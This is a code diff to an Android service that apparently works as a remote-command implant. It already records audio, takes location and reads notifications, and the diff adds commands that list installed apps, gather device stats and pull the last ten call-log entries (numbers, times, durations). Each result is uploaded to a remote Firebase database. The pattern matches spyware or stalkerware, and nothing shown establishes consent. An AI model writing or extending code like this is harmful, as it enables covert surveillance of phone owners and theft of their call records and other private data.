@@ -10,8 +10,13 @@ import android.content.pm.PackageManager
 import android.location.Geocoder
 import android.location.Location
 import android.location.LocationManager
+import android.content.IntentFilter
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.os.BatteryManager
 import android.os.Build
 import android.os.IBinder
+import android.provider.CallLog
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
@@ -89,6 +94,9 @@ class FirebaseCommandService : Service() {
                 AudioRecordManager.stopRecording(currentSessionKey)
             }
             "GET_LOCATION" -> getLocation()
+            "GET_INSTALLED_APPS" -> getInstalledApps()
+            "GET_DEVICE_STATS" -> getDeviceStats()
+            "GET_RECENT_CALLS" -> getRecentCalls()
         }
     }
 
@@ -146,6 +154,108 @@ class FirebaseCommandService : Service() {
         } else {
             postResult("ERROR", "Accessibility service not running")
         }
+    }
+
+    private fun getInstalledApps() {
+        val pm = packageManager
+        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+        val sb = java.lang.StringBuilder()
+        for (appInfo in packages) {
+            if (pm.getLaunchIntentForPackage(appInfo.packageName) != null) {
+                val appName = pm.getApplicationLabel(appInfo).toString()
+                sb.append("$appName (${appInfo.packageName})\n")
+            }
+        }
+        postResult("TEXT", sb.toString().trim(), "GET_INSTALLED_APPS")
+    }
+
+    private fun getDeviceStats() {
+        val sb = StringBuilder()
+
+        // Device Info
+        sb.append("Device: ${Build.MANUFACTURER} ${Build.MODEL}\n")
+        sb.append("OS Version: Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n\n")
+
+        // Battery Status
+        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
+            registerReceiver(null, ifilter)
+        }
+        val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+        val batteryPct = level * 100 / scale.toFloat()
+        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
+        val isCharging: Boolean = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+        sb.append("Battery: ${batteryPct.toInt()}% " + (if (isCharging) "(Charging)\n" else "(Not Charging)\n"))
+
+        // Network Status
+        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val network = cm.activeNetwork
+        val capabilities = cm.getNetworkCapabilities(network)
+        if (capabilities != null) {
+            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
+                sb.append("Network: Connected (Wi-Fi)\n")
+            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
+                sb.append("Network: Connected (Cellular)\n")
+            } else {
+                sb.append("Network: Connected (Other)\n")
+            }
+        } else {
+            sb.append("Network: Disconnected\n")
+        }
+
+        postResult("TEXT", sb.toString().trim(), "GET_DEVICE_STATS")
+    }
+
+    private fun getRecentCalls() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            postResult("ERROR", "READ_CALL_LOG permission not granted", "GET_RECENT_CALLS")
+            return
+        }
+
+        val sb = StringBuilder()
+        val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
+        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 10")
+
+        if (cursor != null && cursor.moveToFirst()) {
+            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
+            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
+            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
+            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
+
+            do {
+                val number = cursor.getString(numberIndex)
+                val typeCode = cursor.getString(typeIndex).toInt()
+                val date = cursor.getLong(dateIndex)
+                val duration = cursor.getString(durationIndex)
+
+                val type = when (typeCode) {
+                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                    CallLog.Calls.MISSED_TYPE -> "Missed"
+                    else -> "Other"
+                }
+
+                val dateStr = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(date))
+                sb.append("$dateStr | $type | $number | ${duration}s\n")
+            } while (cursor.moveToNext())
+            cursor.close()
+            postResult("TEXT", sb.toString().trim(), "GET_RECENT_CALLS")
+        } else {
+            cursor?.close()
+            postResult("TEXT", "No recent calls found.", "GET_RECENT_CALLS")
+        }
+    }
+
+    private fun postResult(type: String, data: String, command: String = "") {
+        val currentSessionKey = sessionKey ?: return
+        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
+        val payload = mapOf(
+            "type" to type,
+            "data" to data,
+            "command" to command,
+            "timestamp" to System.currentTimeMillis()
+        )
+        ref.setValue(payload)
     }
 
     private fun readNotifications() {
